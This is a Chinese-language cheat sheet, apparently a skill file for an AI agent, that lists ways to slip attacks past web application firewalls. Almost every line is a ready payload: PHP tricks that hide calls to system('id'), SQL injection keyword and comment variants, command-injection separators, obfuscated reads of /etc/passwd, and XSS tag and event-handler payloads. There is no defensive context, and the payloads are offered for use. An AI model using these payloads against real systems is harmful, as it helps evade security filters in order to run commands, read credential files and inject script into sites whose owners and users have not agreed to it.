---
name: waf-bypass
description: WAF 绕过技巧库 — 各类WAF绕过方法
---

# WAF 绕过技巧库

## PHP WAF 绕过

### 函数名混淆
- Base64 编码恢复：`$f=base64_decode('c3lzdGVt');$f('id');`
- 字符串拼接：`$f='sys'.'tem';$f('id');`
- 可变函数：`$a='sys';$b='tem';$a$b('id');`

### 关键字绕过
- 拆分路径：`'/va'.'r/ww'.'w/ht'.'ml'`
- 注释绕过：`sys/**/tem('id');`
- 反转字符串：`$f=strrev('metsys');$f('id');`

## SQL 注入绕过

### 关键字绕过
- 大小写混合：`SeLeCt` 代替 `SELECT`
- 内联注释：`S/*!ELECT*/`
- 双重编码：`%2565` → `%65` → `e`
- 等价函数：`GROUP_CONCAT` 替代 `concat_ws`

### 注释符变体
- `-- -` 代替 `--`
- `--+` 代替 `-- `
- `#` 代替 `--`

## 命令注入绕过

### 分隔符变体
- 换行符：`id\nwhoami`
- 管道符：`id|whoami`
- 逻辑运算：`id&&whoami`
- 子 shell：`$(id)` 或 `` `id` ``

### 命令混淆
- 变量拼接：`a=i;b=d;$a$b`
- 通配符：`/bin/ca? /etc/pas?d`
- 空变量：`c'a't /etc/passwd`
- 转义：`c\at /etc/passwd`

## XSS 绕过

### 标签变体
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`

### 事件处理器
- `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`

### 编码绕过
- HTML 实体编码
- Unicode 编码
- Base64 编码（配合 eval）
